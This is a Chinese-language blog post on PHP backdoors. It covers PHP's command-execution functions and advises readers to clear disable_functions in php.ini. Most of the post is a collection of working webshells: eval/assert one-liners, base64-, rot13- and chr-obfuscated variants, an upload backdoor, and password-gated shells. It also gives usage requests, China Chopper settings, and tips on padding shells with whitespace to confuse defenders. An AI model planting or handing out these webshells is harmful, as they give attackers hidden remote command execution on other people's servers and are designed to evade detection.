---
title: php后门
date: 2017-08-28 20:39:59
categories: web
tags: php
---



### 获取输入数据的手段

$\_GET["password"]

$\_POST["password"]

$\_REQUEST["password"]

$\_COOKIE["password"]

$\_GET["password"]

$\_SERVER['HTTP_USER_AGENT']

$\_SERVER['HTTP_HOST']

$_SERVER['HTTP_REFERER']

$_SERVER['HTTP_ACCEPT_LANGUAGE']	// Accept-Language: 

$_SERVER['HTTP_ACCEPT_CHARSET']	// Accept-Charset:

$_SERVER['QUERY_STRING']	/?abcdef

$_SERVER['HTTP_X\_FORWARDED\_FOR']

$_SERVER['HTTP_CONNECTION']	// Connection: 

$_SERVER['HTTP_ACCEPT_ENCODING']  // Accept-Encoding: 

$_SERVER['HTTP_ACCEPT']		// Accept: 

$_SERVER['HTTP_VIA']		// Via: 

$_SERVER['HTTP_CLIENT_IP']	// Client-IP:

$_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS']	// Upgrade-Insecure-Requests:

$_SERVER["HTTP_CACHE_CONTROL"]	// Cache-Control:

$_SERVER["HTTP_KEEP_ALIVE"]			// Keep-Alive: 

$\_SERVER["HTTP_AB_CD"]		// Ab-Cd: 



> 其实从后面的$\_SERVER["HTTP\_"]的一些展示可以看出，对于头文件中的任意字段，只需要将-转换为\_，并且将所有字母转化为大写，那么就可以在php后端中进行处理！所以以HTTP_开头的内容，其实是自定义内容！

### php命令执行函数

php提供4种方法执行系统外部命令：exec()、passthru()、system()、 shell_exec()。
在开始介绍前，先检查下php配置文件php.ini中是有禁止这是个函数。找到 disable_functions，配置如下：

```
disable_functions =
```

如果“disable_functions=”后面有接上面四个函数，将其删除。
默认php.ini配置文件中是不禁止你调用执行外部命令的函数的。

#### exec()

string **exec** ( string `$command` [, array `&$output` [, int `&$return_var` ]] )

```php
<?php
        echo exec("ls",$file);
        echo "</br>";
        print_r($file);
?>
```

执行结果：

```
test.php
Array( [0] => index.php [1] => test.php)
```

知识点：
exec 执行系统外部命令时不会输出结果，而是返回结果的最后一行，如果你想得到结果你可以使用第二个参数，让其输出到指定的数组，此数组一个记录代表输出的一行，即如果输出结果有20行，则这个数组就有20条记录，所以如果你需要反复输出调用不同系统外部命令的结果，你最好在输出每一条系统外部命令结果时清空这个数组，以防混乱。第三个参数用来取得命令执行的状态码，通常执行成功都是返回0。

#### passthru()

void **passthru** ( string `$command` [, int `&$return_var` ] )

```php
<?php
        passthru("ls");
?>
```

执行结果：

```
index.phptest.php
```

知识点：
passthru与exec的区别，passthru直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据。

#### system()

string **system** ( string `$command` [, int `&$return_var` ] )

```
<?php
        system("ls /");
?>
```

执行结果：

```
binbootcgroupdevetchomeliblost+foundmediamntoptprocrootsbinselinuxsrvsystmpusrvar
```

知识点：
system和exec的区别在于system在执行系统外部命令时，直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，如果执行命令成功则返回true，否则返回false。第二个参数与exec第三个参数含义一样。

#### 反撇号`和shell_exec()

```php
<?php
        echo `pwd`;
?>
```

执行结果：

```
/var/www/html
```

知识点：

shell_exec() 函数实际上仅是反撇号 (`) 操作符的变体

#### popen()

resource **popen** ( string `$command` , string `$mode` )

```php
<?php
$handle = popen("dir", "r");
$read = fread($handle, 4096);
echo $read;
pclose($handle);
?>
```

执行结果：

```
 E:\wamp\www\

2017/08/28  19:27    <DIR>          .
2017/08/28  19:27    <DIR>          ..
2017/08/20  11:43               656 404.php
2017/05/07  13:51               145 302.php
```

知识点：

popen也可以执行命令，知识执行命令时不是很方便

#### pcntl_exec()

void **pcntl_exec** ( string `$path` [, array `$args` [, array `$envs` ]] )

```
#exec.php
<?php pcntl_exec(“/bin/bash”, array(“/tmp/b4dboy.sh”));?>

#/tmp/b4dboy.sh
#!/bin/bash
ls -l /
```

### php后门

```php
<?php eval($_POST[1]);?>
post: 1=system("ls");
```

```php
<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>
post: page=system("ls");
```

```php
<?php call_user_func(create_function(null,'assert($_POST[c]);'));?>
post: c=system("ls");
```

```php
<?php $x=base64_decode("YXNzZXJ0");$x($_POST['c']);?>
中间base64解密为assert
post: c=system("ls");
```

```php
<?php array_map("ass\x65rt",(array)$_REQUEST['expdoor']);?>
get/post: expdoor=system("ls");
```

```php
<?php @preg_replace("/f/e",$_GET['u'],"fengjiao"); ?>

mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )
◆i ：如果在修饰符中加上"i"，则正则将会取消大小写敏感性，即"a"和"A" 是一样的。
◆m：默认的正则开始"^"和结束"$"只是对于正则字符串如果在修饰符中加上"m"，那么开始和结束将会指字符串的每一行：每一行的开头就是"^"，结尾就是"$"。
◆s：如果在修饰符中加入"s"，那么默认的"."代表除了换行符以外的任何字符将会变成任意字符，也就是包括换行符！
◆x：如果加上该修饰符，表达式中的空白字符将会被忽略，除非它已经被转义。
◆e：本修饰符仅仅对于replacement有用，代表在replacement中作为PHP代码。
◆A：如果使用这个修饰符，那么表达式必须是匹配的字符串中的开头部分。比如说"/a/A"匹配"abcd"。
◆E：与"m"相反，如果使用这个修饰符，那么"$"将匹配绝对字符串的结尾，而不是换行符前面，默认就打开了这个模式。
◆U：和问号的作用差不多，用于设置"贪婪模式"。

http://localhost/test2.php?u=eval($_POST[c]);
post: c=system("ls");

菜刀中：
密码：c
配置：<O>u=eval($_POST[c]);</O>
```

```php
<?php eval(base64_decode(ZXZhbChiYXNlNjRfZGVjb2RlKFpYWmhiQ2hpWVhObE5qUmZaR1ZqYjJSbEtFeDVPRGhRTTBKdlkwRndiR1J0Um5OTFExSm1WVVU1VkZaR2RHdGlNamw1V0ZOclMweDVPQzVqYUhJb05EY3BMbEJuS1NrNykpOw));?>

其实其将
//<?php
eval($_POST[door])
//?>
多次base64加密解密，并且在一定程度上进行了混淆(插入了chr(47))

post: door=system("ls");
```

```php
<?php @include($_FILES['u']['tmp_name']);  ?>

上传一个木马文件，最好的方式是上传一个大马，这样对方就很难进行测试

请求：
/index.php?c=system('ls');
Content-Type: multipart/form-data; boundary=---------------------------262952846810849
  
-----------------------------262952846810849
Content-Disposition: form-data; name="u"; filename="easy.php"
Content-Type: application/octet-stream

<?php @eval($_GET[c]); ?>
-----------------------------262952846810849--

```

```php
<?php
if($_GET["hackers"]=="2b"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo "url:".$_FILES["upfile"]["name"];if(!file_exists($_FILES["upfile"]["name"])){ copy($_FILES["upfile"]["tmp_name"], $_FILES["upfile"]["name"]); }}?><form method="post" enctype="multipart/form-data"><input name="upfile" type="file"><input type="submit" value="ok"></form><?php }?>

用法：
上传木马文件，最好还是上传大马！
```
```php
<?php $s=@$_GET[2];if(md5($s.$s)=="c70d1cfca94435256f2874706af4c3c8")@eval($_REQUEST[$s]); ?>

用法：
get: ?2=moushen
post/get: moushen=system("ls");
```

```php
<?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF("",$_cC);@$_();?>

等价于：
<?php
$_uU="chr";
$_cC="eval($_POST[1]);";
$_fF="create_function";
$_=create_function("","eval($_POST[1]);");
$_();	// 将上面的语句进行执行

string create_function ( string $args , string $code )
$args是参数("$a,$b,$c")，$code是执行代码，返回的是函数名
要调用时，直接在函数名后面加上()即可。但是需要注意的是，一定不能直接加在create_function之后，需要将其返回给一个变量，然后调用！

使用：
post: 1=system("ls");
```

```php
<?php
md5($_GET['qid'])=='ba710ce1a217e63bf9f5ac483d2e9a6f'?array_map("as\x73ert",(array)$_REQUEST['page']):next;
?>

array array_map ( callable $callback , array $array1 [, array $... ] )
array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。
 
使用：
?qid=moushenhao
post/get: page
```

<font color=#f00>为了迷惑敌人，可以在shell中加入大量空格、换行！！</font>

```php
<?php
$dI3h=${'_REQUEST'}; if (!empty($dI3h['PBbs'])) {     $lwA = $dI3h['UpB_'];    $SdlT=$dI3h['PBbs']($lwA($dI3h['PWWk']),$lwA($dI3h['xfrwA']));    $SdlT($lwA($dI3h['Epd']));   }
?>

知识点：
${'xxx'},其实代表的就是$xxx，其指代的是一个变量
上面的构造有很多种，但是最容易发现的就是create_function

使用：
?PBbs=create_function&UpB_=str_rot13&PWWk=$a&xfrwA=riny($a);&Epd=flfgrz(yf);
每次只需要更改Epd字段的内容即可，对于要输入的字段，每次都是需要rot13的。
  
其实也可以让其看起来简单点：trim/ltrim/rtrim/strtolower/strtoupper
?PBbs=create_function&UpB_=trim&PWWk=$n&xfrwA=eval($n);&Epd=system(ls);
```

```php
### php一句话

* <?php eval($_POST[sb]);?>
* <?php @eval($_POST[sb]);?>
* <?php assert($_POST[sb]);?>
* <?$_POST['sa']($_POST['sb']);?>
* <?$_POST['sa']($_POST['sb'],$_POST['sc'])?>
* <?php @preg_replace("/[email]/e",$_POST['h'],"error"); ?>
　 //使用这个后,使用菜刀一句话客户端在配置连接的时候在"配置"一栏输入
　 <O>h=@eval($_POST[c]);</O>
* <script language="php">@eval($_POST[sb])</script>
* $filename=$_GET['xbid'];
   include ($filename);
* <?php $c='ass'.'ert';${c}($_POST[4]);?>
* <?php $k = str_replace("8","","a8s88s8e8r88t");$k($_POST["8"]); ?>
```

当然，后门还有很多很多种，php小马、大马都值得我们学习，但是只需要学学就可以了，不必专注于此！！！